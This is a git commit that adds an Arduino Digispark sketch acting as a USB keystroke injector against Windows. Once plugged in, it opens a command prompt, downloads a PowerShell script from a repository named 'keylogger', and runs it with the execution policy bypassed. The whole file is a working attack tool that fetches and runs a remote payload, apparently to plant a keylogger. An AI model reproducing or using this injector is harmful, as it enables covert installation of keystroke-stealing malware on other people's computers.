dd1c92460bad5c057f0682be8612e9733e65b5e6
Sumit Sharma <84061534+Su-nlight@users.noreply.github.com>
2024-07-23 22:23:47 +0530

    Create win_injector.ino

---
+++ win_injector.ino
@@ -0,0 +1,34 @@
+#include "DigiKeyboard.h"
+int Led_int=1;
+void setup() {
+  pinMode(Led_int, OUTPUT);
+
+}
+
+void loop() {
+  int i;
+  for(i=0;i<2;i++){ /*this is for showing that it will now run not to be used for actual purpose*/
+    digitalWrite(Led_int,HIGH);
+    delay(1000);
+    digitalWrite(Led_int,LOW);
+    delay(500);}
+
+
+  digitalWrite(Led_int,HIGH);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  delay(200);
+  DigiKeyboard.print("cmd");
+  delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  delay(750);
+  DigiKeyboard.print("curl -O https://raw.githubusercontent.com/Su-nlight/keylogger/main/inject_to_windows.ps1");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  delay(1000);
+  DigiKeyboard.print("powershell -ExecutionPolicy Bypass -File inject_to_windows.ps1");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  delay(6000);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  digitalWrite(Led_int,LOW);
+  while(true);
+}
